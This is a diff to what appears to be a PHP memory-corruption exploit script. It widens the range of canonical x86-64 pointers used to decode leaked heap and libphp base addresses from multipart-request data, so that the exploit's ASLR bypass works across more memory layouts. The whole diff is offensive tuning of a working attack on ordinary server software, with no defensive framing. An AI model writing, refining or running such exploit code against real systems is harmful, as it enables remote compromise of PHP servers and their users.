@@ -52,6 +52,13 @@ BOUNDARY_FILL = b"S" * 17
 BOUNDARY_LEAK = b"B" * 10
 COOKIE_WINDOW = 600_000          # both-bases window: heap cluster + libphp dtor
 CHUNK_WIRE = 262_144
+# Canonical x86-64 user-space pointer range for the leak decode. Kept wide so
+# the decode survives whatever base ASLR hands out: shared libs and Zend-MM
+# chunks can land anywhere from ~0x55xx (PIE) through 0x7fxx, not only 0x7Fxx.
+# Clustering (>=8 hits on one 2 MB bucket) and the dtor page-offset match reject
+# the multipart filler, whose 8-byte runs sit far above 0x800000000000.
+PTR_LO = 0x1000_0000_0000     # 2^44, below PIE/mmap bases (0x55xx, 0x71xx, 0x7fxx)
+PTR_HI = 0x8000_0000_0000     # 2^47, top of canonical x86-64 user space
 
 # ---- measured 128M layouts -------------------------------------------------
 BIG_FIELDS = 250
@@ -260,7 +267,7 @@ def decode_bases(raw: bytes, dtor_offset: int) -> tuple[int, int, int]:
     heaps: Counter[int] = Counter()
     for index in range(len(raw) - 7):
         value = int.from_bytes(raw[index:index + 8], "little")
-        if 0x7F0000000000 <= value < 0x800000000000:
+        if PTR_LO <= value < PTR_HI:
             heaps[value & ~0x1FFFFF] += 1
     if not heaps:
         return 0, 0, 0
@@ -268,7 +275,7 @@ def decode_bases(raw: bytes, dtor_offset: int) -> tuple[int, int, int]:
     modules: Counter[int] = Counter()
     for index in range(0, len(raw) - 7, 8):
         value, = struct.unpack_from("<Q", raw, index)
-        if (0x7F0000000000 <= value < 0x800000000000
+        if (PTR_LO <= value < PTR_HI
                 and value & 0xFFF == dtor_offset & 0xFFF
                 and (value & ~0x1FFFFF) != heap):
             modules[value - dtor_offset] += 1
